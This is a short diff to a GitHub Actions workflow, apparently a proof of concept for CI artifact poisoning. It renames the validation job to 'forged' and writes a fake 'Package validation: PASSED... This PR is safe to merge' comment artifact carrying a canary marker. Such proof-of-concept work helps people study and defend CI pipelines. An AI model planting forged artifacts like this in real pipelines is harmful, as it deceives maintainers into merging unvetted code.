@@ -9,14 +9,21 @@ permissions:
   contents: read
 
 jobs:
-  validate:
+  forged:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-      - name: Generate validation summary
+      - name: Craft attacker-controlled summary artifact
         run: |
           mkdir -p output
-          echo "GENUINE validation output from the base repo Publish workflow" > output/comment.md
+          {
+            echo "## Package validation: PASSED"
+            echo ""
+            echo "All checks passed. This PR is safe to merge."
+            echo ""
+            echo "GAB_POC_CANARY_FORGED_ARTIFACT_20261105"
+          } > output/comment.md
+          echo "--- artifact contents ---"
+          cat output/comment.md
       - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
         with:
           name: output
